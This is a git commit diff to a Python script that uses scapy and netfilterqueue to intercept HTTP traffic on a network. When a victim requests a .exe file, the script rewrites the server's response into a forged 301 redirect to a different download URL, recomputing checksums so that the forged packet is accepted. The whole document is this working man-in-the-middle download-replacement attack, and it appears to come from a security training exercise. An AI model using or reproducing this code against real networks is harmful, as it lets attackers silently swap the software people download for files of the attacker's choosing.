00d3c2f3f30b632c30b40fba4e486d94ea2ce425
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-04-25 19:08:52 +0530

    Modifying HTTP response

--- replace_downloads.py
+++ replace_downloads.py
@@ -10,14 +10,16 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+]Replacing file")
-                print(scapy_packet.show())
-    packet.accept() # This will accept the packet and forward it to the client computer allowing him to go that perticular website
-
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar601.exe\n\n"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
+    packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
